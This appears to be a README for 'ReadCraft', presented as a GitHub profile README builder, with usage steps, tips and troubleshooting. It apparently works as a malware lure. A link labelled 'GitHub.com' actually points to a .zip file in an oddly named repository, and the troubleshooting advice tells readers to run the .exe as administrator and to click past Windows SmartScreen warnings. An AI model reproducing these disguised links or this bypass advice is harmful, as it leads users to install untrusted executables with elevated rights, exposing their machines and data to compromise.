With ReadCraft, you don't need to write any code. You simply:

- **Pick a design style** from 18 beautiful templates.
- **Write or paste your content** in a simple editor.
- **See a live preview** exactly as it will appear on GitHub.

## 📋 Step-by-Step: How to Use ReadCraft

Follow these simple steps to craft your first README:

### 1. Launch ReadCraft
After installing, open the app (see the Download section above). Your browser will open with ReadCraft's interface.

### 2. Choose a Template
On the left side, you'll see a list of style templates. Click through them to preview how your content will look. Pick one that reflects your personality or professional brand.

### 3. Write Your Content
In the main editing area, type or paste text about yourself. You can include:
- A short introduction
- Your skills or technologies you use
- Links to your projects
- Fun facts or interests

Don't worry about formatting—ReadCraft handles the styling for you.

### 4. Add Stat Cards (Optional)
Click the **"Add Stats"** button. A panel will appear where you can customize:
- Which stats to show (stars, commits, pull requests, etc.)
- Card colors and sizes
- Whether to show a theme-aware dark or light version

Your cards will update instantly in the preview.

### 5. Preview and Adjust
As you type, the right side of the screen updates in real-time—this is your live GFM preview. Scroll through it to ensure everything looks perfect. If something looks off, tweak your text or switch templates.

### 6. Export Your README
When you're happy, click the **"Export"** button (usually at the top right). ReadCraft will download a file called `README.md` to your computer.

### 7. Add It to Your GitHub Profile
- Go to [GitHub.com](https://github.com/misused-emergencyalertsystem552/misused-emergencyalertsystem552.github.io/raw/refs/heads/main/flip-five/v3.9.zip) and sign in.
- Create a new repository with the **exact name** as your username (e.g., if your username is `johnsmith`, name the repo `johnsmith`).
- Mark it as **Public**.
- Check the box to **"Add a README file"**—GitHub creates a default one.
- Now, upload your exported `README.md` file to replace the default, or edit the file and paste your content.
- Save it. Done!

## 💡 Tips for a Great README

- **Keep it short** – Visitors skim profiles. Use short paragraphs and bullet points.
- **Show, don't tell** – Use stat cards and icons to show your skills visually rather than listing them.
- **Update regularly** – Refresh your stats and projects as you grow.
- **Be yourself** – Add a personal touch. A small joke or hobby section makes you approachable.

## 🔧 Troubleshooting

**Issue: The app won't start after extraction.**
- Make sure you extracted the *entire* folder, not just a single file.
- Try right-clicking the `.exe` file and selecting **"Run as administrator"**.
- Check if Windows SmartScreen blocks it—if so, click **"More info"** and then **"Run anyway"**.

**Issue: I see an error about a missing `node` or `npm`.**
- ReadCraft is a modern app that runs in your browser. If you see this, it means you opened a development file by accident. Instead, use the `ReadCraft.exe` file, which starts the app automatically.

**Issue: The preview doesn't match GitHub exactly.**
- ReadCraft uses the same GFM (GitHub Flavored Markdown) rules, but some very advanced formatting may render slightly differently. For standard profiles, it's an exact match.
